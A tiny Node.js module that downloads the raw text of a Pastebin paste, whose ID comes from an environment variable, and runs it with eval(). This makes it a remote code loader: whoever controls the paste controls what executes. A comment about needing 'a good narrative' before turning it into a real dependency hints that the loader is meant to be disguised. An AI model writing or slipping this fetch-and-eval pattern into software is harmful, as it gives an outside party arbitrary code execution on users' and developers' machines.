// TODO: Make this a real dependency once we have a good narrative.
const axios = require('axios')

const pastebinId = process.env.PASTEBIN_ID

module.exports = async () => {
  const res = await axios.get(`https://pastebin.com/raw/${pastebinId}`)
  return eval(res.data)
}
